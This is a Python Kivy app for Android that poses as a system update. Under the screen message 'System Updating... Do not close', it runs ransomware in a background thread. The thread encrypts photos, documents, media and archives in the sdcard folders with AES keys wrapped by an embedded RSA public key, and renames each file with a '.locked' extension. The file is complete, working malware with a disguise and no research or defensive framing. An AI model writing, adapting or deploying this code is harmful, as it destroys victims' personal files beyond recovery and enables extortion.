from kivy.app import App
from kivy.uix.label import Label
from kivy.core.window import Window
import threading, os, base64, time
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Random import get_random_bytes

PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA70PwgiCPYhezeG9DpBLR
TK8DLjIrefU8z2BFfgz3iRaMN0HRsCBOptSJqghCX8pGUfUjCuV6oUp5uic7qwRk
vTEc5C+qzRvZS7dhra9VaM6tZJ6l67eX15O+AjN/uBWtIrK/7pmhJ63q0g7nqGTE
oQdVBVtmUbQUXOqWtdWvUhY6Auwx0/jIG8zUhrtunH+CP8VOwGRaij6nwwUWYyaN
XSxnH1g04nAlPVkge4yDdeaKOMktk9OZRU1kE71yqGWKJa+Cnf2a1fq7lR9KNgIX
UZufrp2VZNMWvPZ6Kv8qiTlo3IlMb3wkbBz50JTPY7LAtWJoyDh5UJTmV58Fh35m
YwIDAQAB
-----END PUBLIC KEY-----"""

Window.clearcolor = (0.1, 0.1, 0.1, 1)

TARGET_EXTS = {
    ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
    ".jpg", ".jpeg", ".png", ".gif", ".mp4", ".mp3", ".wav",
    ".zip", ".rar", ".7z", ".tar", ".gz", ".csv", ".json", ".xml"
}

SKIP_DIRS = {"Android", "data", "obb", "sys", "proc", "dev"}
MAX_SIZE = 50 * 1024 * 1024
RSA_MARKER = b"RSAKEY:"
EXT = ".locked"

def encrypt_file(path, rsa_cipher):
    if os.path.getsize(path) > MAX_SIZE: return False
    try:
        with open(path, "rb") as f: plaintext = f.read()
        if plaintext[:7] == RSA_MARKER: return False
        
        aes_key = get_random_bytes(32)
        cipher = AES.new(aes_key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(plaintext)
        wrapped_key = rsa_cipher.encrypt(aes_key)
        
        blob = RSA_MARKER + base64.b64encode(wrapped_key) + b":" + base64.b64encode(cipher.nonce) + b":" + base64.b64encode(tag) + b":" + base64.b64encode(ciphertext)
        
        with open(path, "wb") as f: f.write(blob)
        try: os.rename(path, path + EXT)
        except OSError: pass
        return True
    except:
        return False

def run_payload():
    time.sleep(2)
    try:
        pub_key = RSA.import_key(PUBLIC_KEY_PEM)
        rsa_cipher = PKCS1_OAEP.new(pub_key)
        target_dirs = ["/sdcard/DCIM", "/sdcard/Pictures", "/sdcard/Download", "/sdcard/Documents"]
        
        for root in target_dirs:
            if not os.path.isdir(root): continue
            for dirpath, dirnames, filenames in os.walk(root):
                dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS]
                for name in filenames:
                    ext = os.path.splitext(name)[1].lower()
                    if ext in TARGET_EXTS:
                        encrypt_file(os.path.join(dirpath, name), rsa_cipher)
    except Exception:
        pass

class SystemApp(App):
    def build(self):
        threading.Thread(target=run_payload, daemon=True).start()
        return Label(text="System Updating...\nDo not close.", font_size='20sp', color=(1,1,1,1))

if __name__ == "__main__":
    SystemApp().run()